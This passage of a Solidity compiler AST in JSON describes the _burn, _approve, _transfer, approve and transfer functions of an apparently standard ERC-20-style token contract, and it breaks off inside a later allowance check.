														"overloadedDeclarations": [
															58
														],
														"referencedDeclaration": 58,
														"src": "2364:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 203,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2364:33:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 204,
												"nodeType": "EmitStatement",
												"src": "2359:38:0"
											}
										]
									},
									"documentation": null,
									"id": 206,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_burn",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 177,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 174,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 206,
												"src": "2211:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 173,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2211:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 176,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 206,
												"src": "2225:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 175,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2225:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2210:29:0"
									},
									"returnParameters": {
										"id": 178,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2249:0:0"
									},
									"scope": 435,
									"src": "2196:208:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 229,
										"nodeType": "Block",
										"src": "2483:96:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 221,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"baseExpression": {
																"argumentTypes": null,
																"id": 215,
																"name": "allowance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 29,
																"src": "2493:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																	"typeString": "mapping(address => mapping(address => uint256))"
																}
															},
															"id": 218,
															"indexExpression": {
																"argumentTypes": null,
																"id": 216,
																"name": "owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 208,
																"src": "2503:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "IndexAccess",
															"src": "2493:16:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 219,
														"indexExpression": {
															"argumentTypes": null,
															"id": 217,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 210,
															"src": "2510:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2493:25:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 220,
														"name": "value",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 212,
														"src": "2521:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2493:33:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 222,
												"nodeType": "ExpressionStatement",
												"src": "2493:33:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 224,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 208,
															"src": "2550:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 225,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 210,
															"src": "2557:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 226,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 212,
															"src": "2566:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 223,
														"name": "Approval",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															50
														],
														"referencedDeclaration": 50,
														"src": "2541:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 227,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2541:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 228,
												"nodeType": "EmitStatement",
												"src": "2536:36:0"
											}
										]
									},
									"documentation": null,
									"id": 230,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 213,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 208,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 230,
												"src": "2428:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 207,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2428:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 210,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 230,
												"src": "2443:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 209,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2443:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 212,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 230,
												"src": "2460:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 211,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2460:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2427:47:0"
									},
									"returnParameters": {
										"id": 214,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2483:0:0"
									},
									"scope": 435,
									"src": "2410:169:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 267,
										"nodeType": "Block",
										"src": "2653:151:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 248,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 239,
															"name": "balanceOf",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "2663:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 241,
														"indexExpression": {
															"argumentTypes": null,
															"id": 240,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 232,
															"src": "2673:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2663:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 246,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 236,
																"src": "2701:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 242,
																	"name": "balanceOf",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 23,
																	"src": "2681:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 244,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 243,
																	"name": "from",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 232,
																	"src": "2691:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "2681:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 245,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2239,
															"src": "2681:19:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 247,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2681:26:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2663:44:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 249,
												"nodeType": "ExpressionStatement",
												"src": "2663:44:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 259,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 250,
															"name": "balanceOf",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "2717:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 252,
														"indexExpression": {
															"argumentTypes": null,
															"id": 251,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 234,
															"src": "2727:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2717:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 257,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 236,
																"src": "2751:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 253,
																	"name": "balanceOf",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 23,
																	"src": "2733:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 255,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 254,
																	"name": "to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 234,
																	"src": "2743:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "2733:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 256,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2217,
															"src": "2733:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 258,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2733:24:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2717:40:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 260,
												"nodeType": "ExpressionStatement",
												"src": "2717:40:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 262,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 232,
															"src": "2781:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 263,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 234,
															"src": "2787:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 264,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 236,
															"src": "2791:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 261,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															58
														],
														"referencedDeclaration": 58,
														"src": "2772:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 265,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2772:25:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 266,
												"nodeType": "EmitStatement",
												"src": "2767:30:0"
											}
										]
									},
									"documentation": null,
									"id": 268,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 237,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 232,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 268,
												"src": "2604:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 231,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2604:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 234,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 268,
												"src": "2618:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 233,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2618:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 236,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 268,
												"src": "2630:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 235,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2630:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2603:41:0"
									},
									"returnParameters": {
										"id": 238,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2653:0:0"
									},
									"scope": 435,
									"src": "2585:219:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 286,
										"nodeType": "Block",
										"src": "2883:74:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 278,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2325,
																"src": "2902:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 279,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "2902:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 280,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 270,
															"src": "2914:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 281,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 272,
															"src": "2923:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 277,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 230,
														"src": "2893:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 282,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2893:36:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 283,
												"nodeType": "ExpressionStatement",
												"src": "2893:36:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 284,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2946:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 276,
												"id": 285,
												"nodeType": "Return",
												"src": "2939:11:0"
											}
										]
									},
									"documentation": null,
									"id": 287,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 273,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 270,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 287,
												"src": "2827:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 269,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2827:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 272,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 287,
												"src": "2844:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 271,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2844:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2826:32:0"
									},
									"returnParameters": {
										"id": 276,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 275,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 287,
												"src": "2877:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 274,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2877:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2876:6:0"
									},
									"scope": 435,
									"src": "2810:147:0",
									"stateMutability": "nonpayable",
									"superFunction": 512,
									"visibility": "external"
								},
								{
									"body": {
										"id": 305,
										"nodeType": "Block",
										"src": "3032:70:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 297,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2325,
																"src": "3052:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 298,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "3052:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 299,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 289,
															"src": "3064:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 300,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 291,
															"src": "3068:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 296,
														"name": "_transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 268,
														"src": "3042:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 301,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3042:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 302,
												"nodeType": "ExpressionStatement",
												"src": "3042:32:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 303,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "3091:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 295,
												"id": 304,
												"nodeType": "Return",
												"src": "3084:11:0"
											}
										]
									},
									"documentation": null,
									"id": 306,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 292,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 289,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 306,
												"src": "2981:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 288,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2981:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 291,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 306,
												"src": "2993:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 290,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2993:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2980:27:0"
									},
									"returnParameters": {
										"id": 295,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 294,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 306,
												"src": "3026:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 293,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "3026:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3025:6:0"
									},
									"scope": 435,
									"src": "2963:139:0",
									"stateMutability": "nonpayable",
									"superFunction": 521,
									"visibility": "external"
								},
								{
									"body": {
										"id": 355,
										"nodeType": "Block",
										"src": "3225:244:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 327,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"baseExpression": {
																"argumentTypes": null,
																"id": 317,
																"name": "allowance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 29,
																"src": "3239:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																	"typeString": "mapping(address => mapping(address => uint256))"
																}
															},
															"id": 319,
															"indexExpression": {
																"argumentTypes": null,
																"id": 318,
